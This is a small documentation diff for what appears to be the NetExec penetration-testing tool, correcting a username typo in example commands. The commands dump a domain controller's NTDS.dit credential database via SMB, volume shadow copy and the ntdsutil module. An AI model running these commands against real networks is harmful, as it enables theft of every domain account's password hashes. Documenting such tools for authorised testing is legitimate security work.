@@ -14,10 +14,10 @@ Requires Domain Admin or Local Admin Priviledges on target Domain Controller
 ```
 
 ```
-#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
-#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
-#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
-#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
+#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
+#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
+#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
 ```
 
 {% hint style="info" %}
@@ -27,7 +27,7 @@ You can also DCSYNC with the computer account of the DC
 There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;
 
 ```
-#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M ntdsutil
+#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
 ```
 
 Remember to play this music everytime you got DA
